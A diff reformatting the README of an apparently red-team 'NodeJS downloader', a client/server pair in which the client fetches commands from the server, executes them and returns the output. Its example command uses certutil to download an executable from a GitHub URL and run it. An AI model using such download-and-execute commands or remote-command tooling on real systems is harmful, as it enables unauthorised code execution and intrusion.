@@ -1,7 +1,7 @@
 # Nodejs-Downloader
 An example of a downloader written in NodeJS.
 
-Usage:
+#### Usage:
 
 1. Download the NodeJS:
 
@@ -15,17 +15,21 @@ Edit the Server.js
 
 eg.
 
-var command = 'certutil -urlcache -split -f https://github.com/3gstudent/test/raw/master/putty.exe c:\\a.exe&&c:\\a.exe';
+`var command = 'certutil -urlcache -split -f https://github.com/3gstudent/test/raw/master/putty.exe c:\\a.exe&&c:\\a.exe';`
 
 3. Start the server
 
+```
 node.exe Server.js
+```
 
 When you use a browser to access it, you will return 404.
 
 4. Start the client
 
+```
 node.exe Client.js
+```
 
 It will connect to the server and get the command, then execute the command and send the result again.
 
